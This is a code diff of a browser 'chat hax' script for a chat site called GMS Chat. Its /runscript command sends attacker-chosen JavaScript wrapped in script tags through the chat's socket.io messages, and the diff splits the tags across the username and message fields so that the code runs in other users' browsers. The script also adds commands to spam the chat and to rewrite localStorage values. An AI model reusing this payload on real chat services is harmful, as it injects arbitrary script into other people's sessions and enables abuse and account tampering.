@@ -2,7 +2,7 @@ $('.chat').append("<br><p>GMS Chat Hax Enabled</p><br>");
 $('form').unbind();
 $('form').submit(function(e){
     let socket = io();
-            let message = $(e.target).find('input').val();
+    let message = $(e.target).find('input').val();
     function glc(x) {
         return localStorage.getItem(x);
     }
@@ -62,16 +62,20 @@ $('form').submit(function(e){
     if (message === "/runscript") {
         var scriptToRun = prompt("Run script on server:");
         io().emit('message', {
-            username: '',
-            message: '<script>' + scriptToRun + '</script>',
+            username: '<script>',
+            message: '</script><script>' + scriptToRun + '</script>',
             myrank: '',
             verified: ''
         });
     }
     if (message === "/editval") {
         var valToEdit = prompt("Value to edit:");
-        var toEditTo = prompt("Edeit value to:");
+        var toEditTo = prompt("Edit value to:");
         localStorage.setItem(valToEdit, toEditTo);
+    }
+    if (message === "/spam"){
+        var toSpam = prompt("Input spam:");
+        document.body.children[0].children[6].children[0].value = toSpam;
     }
         e.preventDefault();
 
